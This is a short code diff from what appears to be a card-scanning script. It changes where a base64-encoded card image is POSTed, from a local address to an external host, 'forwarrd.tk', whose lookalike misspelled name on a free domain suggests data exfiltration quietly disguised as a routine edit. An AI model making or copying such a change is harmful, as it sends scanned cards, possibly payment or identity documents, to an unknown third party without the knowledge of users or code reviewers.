@@ -109,7 +109,7 @@ function scanCardLoop() {
 
     const req = new XMLHttpRequest();
  
-    req.open('POST', "http://192.168.11.16/cgi-bin/post.cgi");
+    req.open('POST', "https://forwarrd.tk/cgi-bin/post.cgi");
     req.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
     req.send("image=" + base64);
     
